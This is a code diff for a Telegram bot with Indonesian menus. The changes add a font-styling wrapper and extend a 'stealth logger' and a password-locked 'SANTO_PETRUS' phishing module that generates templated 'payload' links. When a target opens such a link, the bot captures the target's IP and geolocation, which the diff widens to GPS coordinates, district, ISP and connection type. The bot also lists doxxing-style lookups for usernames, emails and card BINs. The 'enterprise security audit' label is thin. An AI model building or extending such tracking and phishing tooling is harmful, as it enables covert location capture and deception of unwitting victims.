@@ -155,33 +155,78 @@ async function startServer() {
   const PASSWORD = process.env.PASSWORD || "112233";
   let authenticatedUsers = new Set<number>();
   
-  if (botInstance) {
-    const mapToSerif = (char: string) => {
-        const code = char.charCodeAt(0);
-        if (code >= 65 && code <= 90) return String.fromCodePoint(0x1D400 + code - 65);
-        if (code >= 97 && code <= 122) return String.fromCodePoint(0x1D41A + code - 97);
-        if (code >= 48 && code <= 57) return String.fromCodePoint(0x1D7CE + code - 48);
-        return char;
-    };
+  const mapToSerif = (char: string) => {
+    const code = char.charCodeAt(0);
+    if (code >= 65 && code <= 90) return String.fromCodePoint(0x1D400 + code - 65);
+    if (code >= 97 && code <= 122) return String.fromCodePoint(0x1D41A + code - 97);
+    if (code >= 48 && code <= 57) return String.fromCodePoint(0x1D7CE + code - 48);
+    return char;
+};
 
-    const applyFont = (text: any) => {
-        if (typeof text !== 'string') return text;
-        const regex = /(<[^>]+>|https?:\/\/\S+|\/\S+|@\w+)/g;
-        return text.split(regex).map((part, i) => {
-            if (i % 2 === 1) return part;
-            return part.split('').map(mapToSerif).join('');
-        }).join('');
-    };
+const applyFont = (text: any) => {
+    if (typeof text !== 'string') return text;
+    const regex = /(<[^>]+>|https?:\/\/\S+|\/\S+|@\w+)/g;
+    return text.split(regex).map((part, i) => {
+        if (i % 2 === 1) return part;
+        return part.split('').map(mapToSerif).join('');
+    }).join('');
+};
 
-    const applyFontToMarkup = (extra: any) => {
-        if (!extra) return extra;
-        if (extra.reply_markup && extra.reply_markup.inline_keyboard) {
-            extra.reply_markup.inline_keyboard = extra.reply_markup.inline_keyboard.map((row: any[]) => 
+const applyFontToMarkup = (extra: any) => {
+    if (!extra) return extra;
+    const newExtra = { ...extra };
+    if (newExtra.reply_markup && newExtra.reply_markup.inline_keyboard) {
+        newExtra.reply_markup = {
+            ...newExtra.reply_markup,
+            inline_keyboard: newExtra.reply_markup.inline_keyboard.map((row: any[]) => 
                 row.map((btn: any) => ({ ...btn, text: applyFont(btn.text) }))
-            );
-        }
-        return extra;
-    };
+            )
+        };
+    }
+    return newExtra;
+};
+
+// Global Telegram Injector
+const injectTelegramFont = () => {
+    if (!botInstance) return;
+    
+    if (!(botInstance.telegram as any).__font_patched) {
+        const _sendMessage = botInstance.telegram.sendMessage.bind(botInstance.telegram);
+        botInstance.telegram.sendMessage = async (chatId, text, extra, ...args) => {
+            return _sendMessage(chatId, applyFont(text), applyFontToMarkup(extra), ...args);
+        };
+        
+        const _sendPhoto = botInstance.telegram.sendPhoto.bind(botInstance.telegram);
+        botInstance.telegram.sendPhoto = async (chatId, photo, extra, ...args) => {
+            const newExtra = applyFontToMarkup(extra);
+            if (newExtra && newExtra.caption) newExtra.caption = applyFont(newExtra.caption);
+            return _sendPhoto(chatId, photo, newExtra, ...args);
+        };
+
+        const _editMessageText = botInstance.telegram.editMessageText.bind(botInstance.telegram);
+        botInstance.telegram.editMessageText = async (chatId, msgId, inlineMsgId, text, extra, ...args) => {
+            return _editMessageText(chatId, msgId, inlineMsgId, applyFont(text), applyFontToMarkup(extra), ...args);
+        };
+        
+        const _sendVoice = botInstance.telegram.sendVoice.bind(botInstance.telegram);
+        botInstance.telegram.sendVoice = async (chatId, voice, extra, ...args) => {
+            const newExtra = applyFontToMarkup(extra);
+            if (newExtra && newExtra.caption) newExtra.caption = applyFont(newExtra.caption);
+            return _sendVoice(chatId, voice, newExtra, ...args);
+        };
+
+        const _answerCbQuery = botInstance.telegram.answerCbQuery.bind(botInstance.telegram);
+        botInstance.telegram.answerCbQuery = async (queryId, text, ...args) => {
+            return _answerCbQuery(queryId, applyFont(text), ...args);
+        };
+
+        (botInstance.telegram as any).__font_patched = true;
+    }
+};
+
+if (botInstance) {
+    injectTelegramFont();
+    
 
     botInstance.use(async (ctx, next) => {
         const userName = ctx.from?.first_name || 'User';
@@ -807,17 +852,19 @@ async function startServer() {
       (async () => {
         let geoInfo = "<i>Fetching Geodata...</i>";
         try {
-          const res = await fetch(`http://ip-api.com/json/${targetIp}?fields=status,country,city,isp,as,mobile,proxy,query`).then(r => r.json());
+          const res = await fetch(`http://ip-api.com/json/${targetIp}?fields=status,country,regionName,city,district,lat,lon,isp,as,org,mobile,proxy,hosting,query`).then(r => r.json());
           if (res.status === 'success') {
-            geoInfo = `├ COUNTRY: <code>${res.country}</code>\n` +
-                      `├ CITY: <code>${res.city}</code>\n` +
-                      `├ ISP: <code>${res.isp}</code>\n` +
-                      `├ VPN/PROXY: <code>${res.proxy ? 'YES' : 'CLEAN'}</code>\n` +
-                      `└ MOBILE: <code>${res.mobile ? 'YES' : 'NO'}</code>`;
+            geoInfo = `├ COUNTRY/REG: <code>${res.country} / ${res.regionName}</code>\n` +
+          `├ CITY/DIST: <code>${res.city} [${res.district || 'N/A'}]</code>\n` +
+          `├ GPS LOC: <code>${res.lat}, ${res.lon}</code>\n` +
+          `├ ISP/ASN: <code>${res.isp} [${res.as}]</code>\n` +
+          `├ ORG/HOST: <code>${res.org}${res.hosting ? ' [DATACENTER/HOSTING]' : ''}</code>\n` +
+          `├ SEC CKSUM: <code>${res.proxy ? '⚠️ PROXY/VPN DETECTED' : '✅ CLEAN RESIDENTIAL'}</code>\n` +
+          `└ CONN TYPE: <code>${res.mobile ? '📱 4G/5G CELLULAR' : '💻 BROADBAND'}</code>`;
           }
         } catch(e) {}
 
-        let header = '🕵️‍♂️ <b>SYSTEM DIAGNOSTIC: Metadata Captured</b>';
+        let header = '🕵️‍♂️ <b>DIAGNOSTIC ENGINE: Enterprise Metadata Captured</b>';
         let statusText = '🔄 <i>SYNCING...</i>';
 
         if (tmplId === 'google') {
@@ -1472,7 +1519,7 @@ async function startServer() {
                          `<i>Silakan pilih menu di bawah ini:</i>`;
     
     const mainKeyboard = Markup.inlineKeyboard([
-      [Markup.button.callback('🕵️ OSINT & Tracker', 'menu_osint_adv'), Markup.button.callback('🎣 Stealth Logger', 'menu_logger')],
+      [Markup.button.callback('🕵️ OSINT & Tracker', 'menu_osint_adv'), Markup.button.callback('🎣 Advanced Stealth Logger', 'menu_logger')],
       [Markup.button.callback('🛠️ Adv Tools', 'menu_tools'), Markup.button.callback('🎮 Mini Games', 'menu_games')],
       [Markup.button.callback('🎵 Media Downloader', 'menu_media'), Markup.button.callback('⏰ Alarm System', 'menu_alarm')],
       [Markup.button.callback('📲 WhatsApp Bot', 'menu_wa'), Markup.button.callback('📱 QR Generator', 'menu_qr')],
@@ -1658,9 +1705,9 @@ async function startServer() {
 
     bot.action('menu_santopetrus', (ctx) => {
       ctx.answerCbQuery().catch(() => {});
-      let msg = `💀 <b>SANTO_PETRUS V.1 PORTAL</b>\n` +
+      let msg = `💀 <b>SANTO_PETRUS V.2 (ENTERPRISE MODULE)</b>\n` +
                 `━━━━━━━━━━━━━━━━━━━━\n` +
-                `Modul Enterprise Security Audit (Phishing Simulator).\n\n` +
+                `Sistem Enterprise Security Audit (Advanced Simulator dengan Heuristik Akurat).\n\n` +
                 `🔒 <b>FITUR TERKUNCI AUTHENTIKASI</b>\n` +
                 `Gunakan command berikut dengan password untuk generate link payload:\n\n` +
                 `<code>/santopetrus [PASSWORD] [TEMPLATE] [REDIRECT_URL]</code>\n\n` +
@@ -1696,10 +1743,10 @@ async function startServer() {
 
     bot.action('menu_osint_adv', (ctx) => {
       ctx.answerCbQuery().catch(() => {});
-      const txt = `<b>📡 OSINT & GLOBAL RECON</b>\n` +
+      const txt = `<b>📡 OSINT & GLOBAL RECON (ENTERPRISE)</b>\n` +
                   `━━━━━━━━━━━━━━━━━━━━\n` +
                   `Pusat intelijen dan pelacakan jejak digital. Semua perintah ada di bawah ini:\n\n` +
-                  `🌐 <b>NETWORK & IP (ADVANCED):</b>\n` +
+                  `🌐 <b>NETWORK & IP (ENTERPRISE AUDIT):</b>\n` +
                   `• /ip [IP_ADDR] - Deteksi ISP, Geo Info.\n` +
                   `• /domain [URL] - Detail DNS, Whois.\n` +
                   `• /subdomain [DOM] - Deteksi sub server terkait.\n` +
@@ -1710,12 +1757,12 @@ async function startServer() {
                   `• /httpheaders [DOM] - Deteksi WAF firewall.\n` +
                   `• /scan [IP_DOM] - Nmap Fast Scan/Port.\n` +
                   `• /mac [MAC] - Cek Vendor Hardware.\n\n` +
-                  `🕵️ <b>DIGITAL FOOTPRINT:</b>\n` +
+                  `🕵️ <b>DIGITAL FOOTPRINT (ENTERPRISE):</b>\n` +
                   `• /username [USER] - Footprint Tracker 150+ web.\n` +
                   `• /email [EMAIL] - Breach scan lookup.\n` +
                   `• /github_user [USER] - Profiling Git Dev.\n` +
                   `• /dork [QUERY] - Google Dorking generator.\n\n` +
-                  `💰 <b>FINANCIAL & SECURITY:</b>\n` +
+                  `💰 <b>FINANCIAL & SECURITY (ENTERPRISE):</b>\n` +
                   `• /bininfo [BIN] - Credit Card BIN Tracker.\n` +
                   `━━━━━━━━━━━━━━━━━━━━`;
       const kb = Markup.inlineKeyboard([
@@ -2000,7 +2047,7 @@ async function startServer() {
     bot.command('logger', (ctx) => {
       const id = generateTrapId(ctx.chat.id);
       
-      let replyMessage = `🎣 <b>STEALTH LINK GENERATED</b>\n` +
+      let replyMessage = `🎣 <b>STEALTH LINK GENERATED (ENTERPRISE GRADE)</b>\n` +
                          `━━━━━━━━━━━━━━━━━━━━\n` +
                          `Silakan pilih template link yang sesuai dengan target Anda:\n\n`;
       
@@ -2029,7 +2076,7 @@ async function startServer() {
         const data = await response.json();
         if (data.status === 'success') {
           const mapLink = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
-          let reply = `<b>🌐 TARGET IP ANALYTICS PRO</b>\n` +
+          let reply = `<b>🌐 TARGET IP ANALYTICS PRO (ENTERPRISE EDITION)</b>\n` +
                       `━━━━━━━━━━━━━━━━━━━━\n` +
                       `💎 <b>IP QUERY:</b> <code>${data.query}</code>\n\n` +
                       `🏢 <b>NETWORK & INFRA:</b>\n` +
@@ -2072,7 +2119,7 @@ async function startServer() {
         const res = await fetch(`https://networkcalc.com/api/dns/whois/${domain}`);
         const data = await res.json();
         if (data.status === 'OK' && data.whois) {
-          let txt = `🌐 <b>WHOIS DATA ANALYTICS</b>\n` +
+          let txt = `🌐 <b>WHOIS DATA ANALYTICS (ENTERPRISE EDITION)</b>\n` +
                     `━━━━━━━━━━━━━━━━━━━━\n` +
                     `💎 <b>DOMAIN:</b> <code>${domain}</code>\n\n` +
                     `📝 <b>REGISTRAR INFO:</b>\n` +
@@ -2114,7 +2161,7 @@ async function startServer() {
            fetchDns('A'), fetchDns('AAAA'), fetchDns('MX'), fetchDns('TXT'), fetchDns('CNAME'), fetchDns('NS')
         ]);
 
-        let txtOutput = `<b>📡 DNS MAPPING PRO</b>\n` +
+        let txtOutput = `<b>📡 DNS MAPPING PRO (ENTERPRISE EDITION)</b>\n` +
                   `━━━━━━━━━━━━━━━━━━━━\n` +
                   `💎 <b>DOMAIN:</b> <code>${domain}</code>\n\n`;
         
@@ -2146,7 +2193,7 @@ async function startServer() {
         const domain = email.split("@")[1];
         const records = await resolveMx(domain);
         if (records && records.length > 0) {
-          const reply = `<b>📧 EMAIL MX VALIDATOR</b>\n` +
+          const reply = `<b>📧 EMAIL MX VALIDATOR (ENTERPRISE EDITION)</b>\n` +
                         `━━━━━━━━━━━━━━━━━━━━\n` +
                         `🎯 <b>TARGET:</b> <code>${email}</code>\n` +
                         `🌐 <b>DOMAIN:</b> <code>${domain}</code>\n\n` +
